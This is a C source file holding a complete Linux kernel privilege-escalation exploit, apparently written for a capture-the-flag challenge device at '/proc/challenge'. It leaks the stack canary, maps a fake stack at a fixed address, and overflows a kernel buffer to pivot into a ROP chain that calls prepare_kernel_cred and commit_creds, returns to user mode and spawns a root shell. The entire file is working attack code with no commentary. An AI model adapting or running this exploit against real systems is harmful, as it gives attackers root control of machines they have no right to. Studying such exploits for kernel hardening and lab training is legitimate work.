#include <stdio.h>
#include <stdlib.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

unsigned long save_ss, save_sp, save_rf, save_cs;

void shell()
{
    system("/bin/sh");
}

void save_user_space()
{
    /* save user-space */
    __asm__(
        ".intel_syntax noprefix;"
        "mov save_ss, ss;"
        "mov save_sp, rsp;"
        "pushf;"
        "pop save_rf;"
        "mov save_cs, cs;"
        ".att_syntax;"
    ); 
}

unsigned long leak_canary(int fd)
{
    unsigned long leak[5];
    read(fd, leak, sizeof(unsigned long) * 5);
    return leak[4];
}

unsigned long *create_stack(unsigned long addr) {
    unsigned long *stack = (unsigned long *)mmap((void *)addr, 0x1000, PROT_READ|PROT_WRITE,
            MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
    unsigned long *target = (unsigned long *)(addr + 0x500);

    target[0] = 0xffffffff81001518; // pop rdi; ret
    target[1] = 0x00;               // rdi = 0x00
    target[2] = 0xffffffff810881c0; // prepare_kernel_cred

    target[3] = 0xffffffff81001518; // pop rdi; ret
    target[4] = 0x00;               // rdi = 0x00
    target[5] = 0xffffffff8158f72a; // add rdi, rax; cmp rdi, 0x1; setbe al; ret
    target[6] = 0xffffffff81087e80; // commit_creds

    target[7] = 0xffffffff81c00a45; // swapgs_restore_regs_and_return_to_usermode + 0x16
    target[8] = 0x00;               // rax = 0x00
    target[9] = 0x00;               // rdi = 0x00

    target[10] = (unsigned long)shell;
    target[11] = save_cs;
    target[12] = save_rf;
    target[13] = save_sp;
    target[14] = save_ss;

    return target;
}

void overflow_buffer(int fd, unsigned long canary, unsigned long stack)
{
    unsigned long payload[20];

    payload[4] = canary;
    
    payload[5] = 0xffffffff8102bd41; // pop rsp; ret 
    payload[6] = 0x31337500;         // rsp = 0x31337500 

    write(fd, payload, sizeof(unsigned long) * 20);
}

int main(int argc, char **argv)
{
    save_user_space();
    unsigned long *stack = create_stack(0x31337000);

    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary, (unsigned long)stack); 

    return 0;
}

